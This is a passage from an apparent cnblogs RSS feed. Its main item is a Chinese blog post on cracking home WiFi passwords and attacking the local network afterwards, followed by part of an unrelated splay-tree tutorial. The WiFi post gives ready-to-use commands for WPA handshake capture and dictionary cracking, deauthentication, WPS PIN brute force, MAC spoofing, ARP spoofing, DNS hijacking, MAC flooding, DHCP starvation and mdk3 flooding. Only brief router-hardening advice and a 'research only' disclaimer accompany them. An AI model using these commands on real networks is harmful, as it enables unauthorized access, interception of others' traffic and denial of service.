&lt;li&gt;运行下图的&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200805202641106-1359042232.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/li&gt;
&lt;li&gt;开机kali后 虚拟机选择网卡的连接&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200805202708855-1840948878.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/li&gt;
&lt;li&gt;ifconfig 查看连接一般名字为wlan,但有肯能无线网卡处于down状态可用ifconfig -a查看,然后使ifconfig name up即可&lt;/li&gt;
&lt;/ol&gt;&lt;h4 id=&quot;无线网卡一般有四种工作模式，即-managed，master，ad-hoc，monitor。&quot;&gt;无线网卡一般有四种工作模式，即 Managed，Master，Ad-hoc，Monitor。&lt;/h4&gt;
&lt;p&gt;Managed 模式：该模式用于你的无线客户端直接与无线接入点（Access Point，即AP）进行接入连接。在这个模式中，我们可以进行无线接入internet上网，无线网卡的驱动程序依赖无线AP管理整个通信过程。&lt;br/&gt;Master 模式：一些无线网卡支持Master模式。这个模式允许无线网卡使用特制的驱动程序和软件工作，作为其他设备的无线AP。它主要使用于无线接入点AP提供无线接入服务以及路由功能。比如无线路由器就是工作在Master模式下了，对于普通的pc机来说，如果有合适的硬件它也可以变成一台无线AP。&lt;br/&gt;Ad hoc模式：当你的网络由互相直连的设备组成时，就使用这个模式。在这个模式中，各设备之间采用对等网络的方式进行连接，无线通信双方共同承担无线AP的职责。&lt;br/&gt;Monitor 模式：Monitor模式主要用于监控无线网络内部的流量，用于检查网络和排错。要使Wireshark捕获无线数据包，你的无线网卡和配套驱动程序必须支持监听模式（也叫RFMON模式）。&lt;/p&gt;
&lt;h4 id=&quot;kali桥接网卡上网&quot;&gt;kali桥接网卡上网&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200805203429447-575870983.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;参见:&lt;a href=&quot;https://www.linuxidc.com/Linux/2016-09/135521p3.htm&quot;&gt;https://www.linuxidc.com/Linux/2016-09/135521p3.htm&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;wifi密码的破解&quot;&gt;wifi密码的破解&lt;/h2&gt;
&lt;p&gt;因为wep加密已经没有使用的，非常不安全，就忽略了&lt;/p&gt;
&lt;h3 id=&quot;最简单最好用的wifi密码破解方法&quot;&gt;最简单最好用的wifi密码破解方法&lt;/h3&gt;
&lt;p&gt;使用wifi万能钥匙，腾讯wifi管家等等，其原理就是wifi密码共享，使用过该软件会将你的连接过的wifi密码共享出去，其本身不是破解而是共享制，连接后我们就可以看见密码了，所以这种破解方法非常的好用，首先推荐&lt;/p&gt;
&lt;h3 id=&quot;基础说明airodump-ng&quot;&gt;基础说明airodump-ng&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;airmon-ng start wlan0     开启监听模式
airodump-ng wlan0mon      开始扫描附近wifi
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;airodump-ng wlan0mon参数：&lt;br/&gt;-w 输出文件&lt;br/&gt;--ivs 只保存ivs，不再保存所有无线数据，只是保存可以用于破解的IVS数据报文&lt;br/&gt;-c 指定信道&lt;br/&gt;--bssid 指定路由的bssid也就是MAC地址&lt;br/&gt;--essid 指定路由的essid，可以理解为wifi名称（不准确）&lt;br/&gt;airodump-ng wlan0mon 扫描参数&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200805204407477-982489563.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;BSSID AP的MAC地址&lt;br/&gt;PWR 信号强度接近0信号好&lt;br/&gt;Beacons 无线ap的发送通告，告诉我是谁 周期发送&lt;br/&gt;#Data 抓到的数据包&lt;br/&gt;CH 信道&lt;br/&gt;MB 最大传输速度&lt;br/&gt;ENC 加密方法&lt;br/&gt;CIPHER 加密算法&lt;br/&gt;AUTH 认证协议&lt;br/&gt;ESSID 通指wifi名字 &amp;lt;length： &amp;gt;表示未广播&lt;br/&gt;STATION 客户端&lt;br/&gt;RATE 传输速率&lt;br/&gt;Lost 最近10秒的丢包数&lt;br/&gt;Frames 来自客户端的数据&lt;br/&gt;Probes 主动弹出 如果客户端正试图连接一个AP但没有连上，会显示这里&lt;br/&gt;Aircrack-ng工具包&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;aircrack-ng 破解&lt;/li&gt;
&lt;li&gt;airmon-ng 改变网卡工作模式&lt;/li&gt;
&lt;li&gt;airodump-ng 捕获报文&lt;/li&gt;
&lt;li&gt;aireplay-ng 提供各种攻击&lt;/li&gt;
&lt;li&gt;airserv-ng 网卡连接到指定端口 用作无限跳板&lt;/li&gt;
&lt;li&gt;airolib-ng 彩虹表破解创建数据库文件&lt;/li&gt;
&lt;li&gt;airdecap-ng 解包&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;wpa破解&quot;&gt;WPA破解&lt;/h3&gt;
&lt;p&gt;指定监听的wifi&lt;br/&gt;airodump-ng -w [文件] --bssid [wifibssid] -c [信道最好指定] wlan0mon&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200805205002636-2040427051.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;管理针攻击将其他用户踢下线&lt;br/&gt;aireplay-ng -0 5 -a [路由bssid] -c [客户端STATION] wlan0mon&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200805205032856-1120757572.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;管理针攻击获得握手包&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200805205116774-1488470919.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;如果出现错误可尝试&lt;br/&gt;--ignore-negative-one 忽略-1信道&lt;br/&gt;根据握手包暴力破解密码&lt;br/&gt;aircrack-ng -w [密码字典] [握手包.cap]&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200805205210602-765455093.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200805205219225-1654021583.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200805205226645-559737992.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;根据握手包破解密码加速&lt;br/&gt;这里推荐使用windows下GPU加速工具EWSA，还有其他加速方式不过我不怎么推荐，也可以找专业的跑包团队来跑包&lt;br/&gt;EWSA下载和使用说明地址:&lt;a href=&quot;https://www.52pojie.cn/thread-989800-1-1.html&quot;&gt;https://www.52pojie.cn/thread-989800-1-1.html&lt;/a&gt;&lt;br/&gt;找跑包地址：&lt;a href=&quot;https://www.anywlan.com/forum-134-1.html&quot;&gt;https://www.anywlan.com/forum-134-1.html&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;ping攻击-前提路由器开启wps&quot;&gt;ping攻击 前提路由器开启wps&lt;/h3&gt;
&lt;p&gt;8位ping码，第8位数是校验码，只需要破解七位，ping码分前部分(4位)后部分(3位)，pin认证连接失败，路由器返回EAP-NACK信息，通过回应，能够确定pin的前部分或后部分是否正确，所以可能性是11000(10&lt;sup&gt;4+10&lt;/sup&gt;3),不过考虑信号和路由器的处理性能网卡功率等可能时间会长，如果信号好，网卡，路由器也比较好一般需要6个小时左右&lt;br/&gt;查看开启wps的wifi&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;wash -i wlan0mon
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200808172826402-1294028992.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;reaver -I wlan0mon -b [BSSID] -vv 还可以加其他参数 进行爆破&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200808172859086-820610537.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;kali自动化工具wifite&quot;&gt;kali自动化工具wifite&lt;/h3&gt;
&lt;p&gt;原理：就是上面的命令只不过是自动化了&lt;br/&gt;使用：cmd输入wifite进入扫描&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200808173636352-785623089.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;觉得扫描好了ctrl+c就好，按照序号选择要破解的wifi即可，根据wifi开启了啥会进行自动的破解，如果想跳过某个破解方式按ctrl+c即可，如果获取到握手包自带的密码字典没跑出来，可以去上面提醒的路径找握手包，用自己的字典跑&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200808173838669-482349328.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200808174140577-537626025.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;突破限制&quot;&gt;突破限制&lt;/h3&gt;
&lt;h4 id=&quot;mac地址限制&quot;&gt;mac地址限制&lt;/h4&gt;
&lt;p&gt;扫描查看已连接的客户机的mac地址将网卡的mac地址改为其即可&lt;br/&gt;先down掉网卡&lt;br/&gt;ifconfig wlan0 down&lt;br/&gt;修改mac地址&lt;br/&gt;macchanger wlan0 -m [需要修改的mac地址，有些网卡可能不支持修改]&lt;br/&gt;启动网卡&lt;br/&gt;ifconfig wlan0 up&lt;/p&gt;
&lt;h4 id=&quot;未广播ssid的wifi&quot;&gt;未广播ssid的wifi&lt;/h4&gt;
&lt;p&gt;1.等待其他用户连接，会先询问ssid&lt;br/&gt;airodump-ng wlan0mon 就能看见&lt;br/&gt;2.将别人踢下线，让其重连，和抓起握手包一样，注意信道&lt;br/&gt;aireplay-ng -0 5 -a [路由bssid] -c [客户端STATION]&lt;/p&gt;
&lt;h2 id=&quot;连接wifi后的利用内网渗透&quot;&gt;连接wifi后的利用(内网渗透)&lt;/h2&gt;
&lt;h3 id=&quot;arp欺骗&quot;&gt;ARP欺骗&lt;/h3&gt;
&lt;p&gt;查看内网的主机&lt;br/&gt;nmap -sP 192.168.1.0/24 -v&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200808174845719-1283152798.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;开启转发模式&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;双向欺骗分别是目标主机ip和网关&lt;br/&gt;arpspoof -i eth0 -t 192.168.1.1 -r 192.168.1.106&lt;br/&gt;arpspoof -i eth0 -t 192.168.1.106 -r 192.168.1.1&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200808175100302-890616069.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200808175106670-367018824.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;启动wireshare查看ip.src == 192.168.1.106，发现欺骗成功可以拦截他的访问&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200808175125771-1552273399.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;driftnet -i eth0 监听图片&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200808175210484-991778107.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;毒化内网用户无法上网&quot;&gt;毒化内网用户无法上网&lt;/h3&gt;
&lt;p&gt;原理:进行arp欺骗但不进行转发&lt;br/&gt;echo 0 &amp;gt; /proc/sys/net/ipv4/ip_forward&lt;br/&gt;双向欺骗&lt;br/&gt;arpspoof -i eth0 -t 192.168.1.1 -r 192.168.1.106&lt;br/&gt;arpspoof -i eth0 -t 192.168.1.106 -r 192.168.1.1&lt;/p&gt;
&lt;h3 id=&quot;dns劫持&quot;&gt;dns劫持&lt;/h3&gt;
&lt;p&gt;目标主机window7 ip地址 192.168.124.128&lt;br/&gt;攻击机kali ip地址 192.168.124.139&lt;br/&gt;劫持到web服务window10(phpstudy) ip地址 192.168.1.104&lt;br/&gt;修改配置文件nano /etc/ettercap/etter.dns&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200808175323894-1815520249.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;ettercap -Tq -i eth0 -P dns_spoof /// ///&lt;br/&gt;进行欺骗-i后是无线网卡 ///中加目标主机和网卡，不加就是全部，发现window7被劫持成功，如果安装杀毒软件可能劫持不了&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200808175350052-1270686757.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200808175404896-282630640.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;如何恢复&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ipconfig/flushdns刷新即可
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200808175459972-1883600540.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;mac地址表泛红&quot;&gt;mac地址表泛红&lt;/h3&gt;
&lt;p&gt;交换机中有mac地址表记录连接的pc，攻击者不断刷新mac地址来填满交换机的mac地址表，交换机在mac地址表找不到该用户只能通过广播的形式发送，攻击者就可以截获数据&lt;br/&gt;交换机设置静态mac地址绑定可预防，非表内请求将全部丢弃&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;macof -i eth0
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;dhcp地址耗尽攻击&quot;&gt;dhcp地址耗尽攻击&lt;/h3&gt;
&lt;p&gt;路由器分配ip，攻击者发送大量discover包来获取ip让其者无ip使用，无法连接&lt;br/&gt;先安装&lt;br/&gt;apt-get install yersinia&lt;br/&gt;启动&lt;br/&gt;yersinia -G&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200808175733608-1719035963.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200808175743364-1323920399.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;干扰通讯&quot;&gt;干扰通讯&lt;/h2&gt;
&lt;p&gt;以下利用前提无线网卡要开启监听模式&lt;/p&gt;
&lt;h3 id=&quot;创建恶意的无线热点&quot;&gt;创建恶意的无线热点&lt;/h3&gt;
&lt;p&gt;工具mdk3 mdk3可查看使用说明&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;mdk3 wlan0mon b -n SSID (-f 可以导入列表创建多个ssidwifi，不指定则随机) -c [信道] -w -g -s 100
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;验证洪水攻击攻击路由器&quot;&gt;验证洪水攻击(攻击路由器)&lt;/h3&gt;
&lt;p&gt;伪造大量的client去连接ap,可导致正在已连接用户无反应 -a后加交换机ssid&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;mdk3 wlan0mon a -a FC:D7:33:DE:F3:8A -c  -s 300
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;强制解除验证洪水攻击方式针对客户机使其下线，通过模仿管理针&quot;&gt;强制解除验证洪水攻击方式(针对客户机使其下线，通过模仿管理针)&lt;/h3&gt;
&lt;p&gt;就是之前抓握手包一样将别人踢下线&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;aireplay-ng -0 5 -a [路由bssid] -c [客户端STATION] wlan0mon
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;用mdk3针对全网，在攻击中踢掉线后也无法连接成功&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;mdk3 wlan0mon d
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可-b 加文件指定mac地址攻击&lt;/p&gt;
&lt;h2 id=&quot;如何设置路由器更安全&quot;&gt;如何设置路由器更安全&lt;/h2&gt;
&lt;p&gt;攻与防御本身就是一场博弈根据上面的攻击方式我们可以设置路由器是wifi更安全尤其是物联网的发展，家里的很多东西都要连接网络&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;wifi加密方式采用wpa加密，不用采用wpe加密，如果不懂wps，也不要开启wps功能&lt;/li&gt;
&lt;li&gt;wifi密码要不要使用弱口令&lt;/li&gt;
&lt;li&gt;对于常用设备可以进行ip和mac的绑定&lt;/li&gt;
&lt;li&gt;如果没有用户之间相互访问的需求可以开启ap隔离&lt;/li&gt;
&lt;li&gt;可以设置访客wifi，防止密码被泄露&lt;/li&gt;
&lt;li&gt;就是选用一些比较好的路由器，防止路由器本身存在漏洞，路由器页面就是web页面可能存在漏洞&lt;/li&gt;
&lt;li&gt;尽量少使用wifi万能钥匙，腾讯wifi管家等，或者使用时找到里面的设置不共享自己的wifi密码&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;参考文章&quot;&gt;参考文章&lt;/h2&gt;
&lt;p&gt;b站：&lt;a href=&quot;https://www.bilibili.com/video/BV1e7411o7GB?p=1&quot;&gt;https://www.bilibili.com/video/BV1e7411o7GB?p=1&lt;/a&gt;&lt;br/&gt;b站：&lt;a href=&quot;https://www.bilibili.com/video/BV14z4y1Q7Nb?from=search&amp;amp;seid=10037556429710890008&quot;&gt;https://www.bilibili.com/video/BV14z4y1Q7Nb?from=search&amp;amp;seid=10037556429710890008&lt;/a&gt;&lt;br/&gt;论坛：&lt;a href=&quot;https://www.anywlan.com/&quot;&gt;https://www.anywlan.com/&lt;/a&gt;&lt;br/&gt;等等等很多前辈的文章，没法都列举(找不到了)，表示抱歉和感谢&lt;br/&gt;最后欢迎访问我的个人博客：&lt;a href=&quot;https://lmg66.github.io/&quot;&gt;https://lmg66.github.io/&lt;/a&gt;&lt;br/&gt;说明：本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担&lt;/p&gt;
</description>
<pubDate>Sat, 08 Aug 2020 12:24:00 +0000</pubDate>
<dc:creator>Lmg66</dc:creator>
<og:description>前言 本文主要讲述 家庭家庭家庭中（重要的事情说三遍，企业认证服务器的wifi一般非常非常的安全破解不来）如何破解wifi密码，破解wifi密码后的内网渗透利用(简单说明)，如何设置wifi路由器更安</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/Lmg66/p/13442363.html</dc:identifier>
</item>
<item>
<title>伸展树（Splay）学习笔记 - quanjun</title>
<link>http://www.cnblogs.com/quanjun/p/13460167.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/quanjun/p/13460167.html</guid>
<description>&lt;p&gt;二叉排序树能够支持多种动态集合操作，它可以被用来表示有序集合，建立索引或优先队列等。因此，在信息学竞赛中，二叉排序树应用非常广泛。&lt;/p&gt;
&lt;p&gt;作用于二叉排序树上的基本操作，其时间复杂度均与树的高度成正比，对于一棵有 &lt;span class=&quot;math inline&quot;&gt;\(n\)&lt;/span&gt; 个节点的二叉树，这些操作在最有情况下运行时间为 &lt;span class=&quot;math inline&quot;&gt;\(O( \log_2 n)\)&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;但是，如果二叉树退化成了一条 &lt;span class=&quot;math inline&quot;&gt;\(n\)&lt;/span&gt; 个节点组成的线性链表，则这些操作在最坏情况下的运行时间为 &lt;span class=&quot;math inline&quot;&gt;\(O(n)\)&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;有些二叉排序树的变形，其基本操作的性能在最坏情况下依然很好，如平衡树（AVL）等。但是，它们需要额外的空间来存储平衡信息，且实现起来比较复杂。同时，如果访问模式不均匀，平衡树的效率就会受到影响，而伸展树却可以克服这些问题。&lt;/p&gt;
&lt;p&gt;伸展树（Splay Tree），是对二叉排序树的一种改进。虽然它并不能保证树一直是“平衡”的，但对于它的一系列操作，可以证明其每一步操作的“平摊时间”复杂度都是 &lt;span class=&quot;math inline&quot;&gt;\(O(\log_2 n)\)&lt;/span&gt; 。平摊时间是指在一系列最坏情况的操作序列中单次操作的平均时间。所以，从某种意义上来说，伸展树也是一种平衡的二叉排序树。而在各种树形数据结构中，伸展树的空间复杂度（不需要记录用于平衡的冗余信息）和编程复杂度也都是很优秀的。&lt;/p&gt;
&lt;p&gt;获得较好平摊效率的一种方法就是使用“自调整”的数据结构，与平衡结构或有明确限制的数据结构相比，自调整的数据结构有一下几个优点：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;从平摊角度上，它们忽略常数因子，因此绝对不会差于有明确限制的数据结构，而且它们可以根据具体使用情况进行调整，所以在使用模式不均匀的情况下更加有效；&lt;/li&gt;
&lt;li&gt;由于无需存储平衡信息或者其他限制信息，所以所需的存储空间更小；&lt;/li&gt;
&lt;li&gt;它们的查找和更新的算法与操作都很简单，易于实现。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;当然，自调整的数据结构也有其潜在的缺点：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;它们需要更多的局部调整，尤其在查找期间，而那些有明确限制的数据结构仅需要在更新期间进行调整，查找期间则不需要；&lt;/li&gt;
&lt;li&gt;一系列查找操作中的某一个可能会耗时较长，这在实时处理的应用程序中可能是一个不足之处。&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;1-伸展树的主要操作&quot;&gt;1. 伸展树的主要操作&lt;/h2&gt;
&lt;p&gt;伸展树是对二叉排序树的一种改进。与二叉排序树一样，伸展树也具有有序性，即伸展树中的每一个节点 &lt;span class=&quot;math inline&quot;&gt;\(x\)&lt;/span&gt; 都满足：该节点左子树中的每一个元素都小于 &lt;span class=&quot;math inline&quot;&gt;\(x\)&lt;/span&gt;，而其右子树中的每一个元素都大于 &lt;span class=&quot;math inline&quot;&gt;\(x\)&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;但是，与普通二叉排序树不同的是，伸展树可以“自我调整”，这就要依靠伸展树的核心操作 —— &lt;span class=&quot;math inline&quot;&gt;\(\text{Splay(x, S)}\)&lt;/span&gt;。&lt;/p&gt;
&lt;h3 id=&quot;11-伸展操作&quot;&gt;1.1 伸展操作&lt;/h3&gt;
&lt;p&gt;伸展操作 &lt;span class=&quot;math inline&quot;&gt;\(\text{Splay(x, S)}\)&lt;/span&gt; 是在保持伸展树有序的前提下，通过一系列旋转，将伸展树 &lt;span class=&quot;math inline&quot;&gt;\(\text{S}\)&lt;/span&gt; 中的元素 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt; 调整至数的根部。在调整的过程中，要分以下三种情况分别处理。&lt;/p&gt;
&lt;h4 id=&quot;情况一：节点--的父节点--是根节点。&quot;&gt;情况一：节点 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt; 的父节点 &lt;span class=&quot;math inline&quot;&gt;\(\text{y}\)&lt;/span&gt; 是根节点。&lt;/h4&gt;
&lt;p&gt;此时，&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;若 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt; 是 &lt;span class=&quot;math inline&quot;&gt;\(\text{y}\)&lt;/span&gt; 的左儿子，则我们进行一次右旋操作 &lt;span class=&quot;math inline&quot;&gt;\(\text{Zig(x)}\)&lt;/span&gt;；&lt;/li&gt;
&lt;li&gt;若 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt; 是 &lt;span class=&quot;math inline&quot;&gt;\(\text{y}\)&lt;/span&gt; 的右儿子，则我们进行一次左旋操作 &lt;span class=&quot;math inline&quot;&gt;\(\text{Zag(x)}\)&lt;/span&gt;。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;经过旋转，使 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt; 成为二叉排序树 &lt;span class=&quot;math inline&quot;&gt;\(S\)&lt;/span&gt; 的根节点，且依然满足二叉排序树的性质。&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math inline&quot;&gt;\(\text{Zig}\)&lt;/span&gt; 操作和 &lt;span class=&quot;math inline&quot;&gt;\(\text{Zag}\)&lt;/span&gt; 操作如图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1878967/202008/1878967-20200808092025709-1015616445.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;情况二：节点--的父节点--不是根节点，且--和--同为各自父节点的左儿子，或同为各自父节点的右儿子。&quot;&gt;情况二：节点 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt; 的父节点 &lt;span class=&quot;math inline&quot;&gt;\(\text{y}\)&lt;/span&gt; 不是根节点，且 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt; 和 &lt;span class=&quot;math inline&quot;&gt;\(\text{y}\)&lt;/span&gt; 同为各自父节点的左儿子，或同为各自父节点的右儿子。&lt;/h4&gt;
&lt;p&gt;此时，我们设 &lt;span class=&quot;math inline&quot;&gt;\(\text{z}\)&lt;/span&gt; 为 &lt;span class=&quot;math inline&quot;&gt;\(\text{y}\)&lt;/span&gt; 的父节点，&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;若 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt; 和 &lt;span class=&quot;math inline&quot;&gt;\(\text{y}\)&lt;/span&gt; 同时是各自父节点的左儿子，则进行一次 &lt;span class=&quot;math inline&quot;&gt;\(\text{Zig-Zig}\)&lt;/span&gt; 操作；&lt;/li&gt;
&lt;li&gt;若 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt; 和 &lt;span class=&quot;math inline&quot;&gt;\(\text{y}\)&lt;/span&gt; 同时是各自父节点的右儿子，则进行一次 &lt;span class=&quot;math inline&quot;&gt;\(\text{Zag-Zag}\)&lt;/span&gt; 操作。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;如图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1878967/202008/1878967-20200808093748870-820303649.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;情况三：节点--的父节点--不是根节点，且--和--中的一个是其父节点的左儿子，另一个是其父节点的右儿子。&quot;&gt;情况三：节点 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt; 的父节点 &lt;span class=&quot;math inline&quot;&gt;\(\text{y}\)&lt;/span&gt; 不是根节点，且 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt; 和 &lt;span class=&quot;math inline&quot;&gt;\(\text{y}\)&lt;/span&gt; 中的一个是其父节点的左儿子，另一个是其父节点的右儿子。&lt;/h4&gt;
&lt;p&gt;此时，我们设 &lt;span class=&quot;math inline&quot;&gt;\(\text{z}\)&lt;/span&gt; 为 &lt;span class=&quot;math inline&quot;&gt;\(\text{y}\)&lt;/span&gt; 的父节点，&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;若 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt; 是 &lt;span class=&quot;math inline&quot;&gt;\(\text{y}\)&lt;/span&gt; 的左儿子，&lt;span class=&quot;math inline&quot;&gt;\(\text{y}\)&lt;/span&gt; 是 &lt;span class=&quot;math inline&quot;&gt;\(\text{z}\)&lt;/span&gt; 的右儿子，则进行一次 &lt;span class=&quot;math inline&quot;&gt;\(\text{Zig-Zag}\)&lt;/span&gt; 操作；&lt;/li&gt;
&lt;li&gt;若 &lt;span class=&quot;math inline&quot;&gt;\(\text{x}\)&lt;/span&gt; 是 &lt;span class=&quot;math inline&quot;&gt;\(\text{y}\)&lt;/span&gt; 的右儿子，&lt;span class=&quot;math inline&quot;&gt;\(\text{y}\)&lt;/span&gt; 是 &lt;span class=&quot;math inline&quot;&gt;\(\text{z}\)&lt;/span&gt; 的左二子，则进行一次 &lt;span class=&quot;math inline&quot;&gt;\(\text{Zag-Zig}\)&lt;/span&gt; 操作。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1878967/202008/1878967-20200808095317393-501056272.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
